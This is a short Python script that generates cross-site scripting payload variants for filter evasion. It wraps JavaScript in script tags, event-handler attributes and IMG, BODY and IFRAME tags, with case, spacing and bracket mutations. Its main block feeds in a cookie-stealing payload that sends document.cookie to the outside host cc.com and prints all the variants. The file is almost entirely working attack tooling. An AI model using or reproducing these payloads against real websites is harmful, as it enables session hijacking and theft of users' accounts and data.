import random
def randomurl():
    chars='abcdefghijklmnopqrstuvwxyz'
    length=random.randint(5, 20)
    choice=random.choice
    return ''.join(choice(chars) for i in range(length))+'.com'
    
def xssencode(javascript):
    options=['<script>{}</script>',
             '<a onmouseover="{}">link</a>',
             '<IMG """><SCRIPT>{}</SCRIPT>">',
             '<IMG SRC=# onmouseover="{}">',
             '<IMG onmouseover="{}">',
             '<IMG SRC=/ onerror="{}"></img>',
             '<BODY ONLOAD={}>',
             '<IFRAME SRC=# onmouseover="{}"></IFRAME>',
             '<img src="%s/not.exist" onerror={}>' % randomurl()]
    for i in options:
        for a in [i.upper(), i.lower()]:
            for b in [a.replace('>', ' >'), a]:
                for c in [b.replace('<', '<<'), b]:
                    yield c.format(javascript)
##    yield '<script>%s</script>' % javascript
##    yield '<script >%s</script>' % javascript
##    yield '<<SCRIPT>%s//<</SCRIPT>' % javascript
##    yield '<a onmouseover="%s">xxs link</a>' % javascript
##    yield '<IMG """><SCRIPT>%s</SCRIPT>">' % javascript
##    yield '''<IMG SRC=# onmouseover="%s">''' % javascript
##    yield '''<IMG SRC= onmouseover="%s">''' % javascript
##    yield '''<IMG onmouseover="%s">''' % javascript
##    yield '<IMG SRC=/ onerror="%s"></img>' % javascript
##    yield '<BODY ONLOAD=%s>' % javascript
##    yield '<IFRAME SRC=# onmouseover="%s"></IFRAME>' % javascript
if __name__=='__main__':
    attack="open('http://cc.com/?'+document.cookie)"
    print('\n'.join(xssencode(attack)))
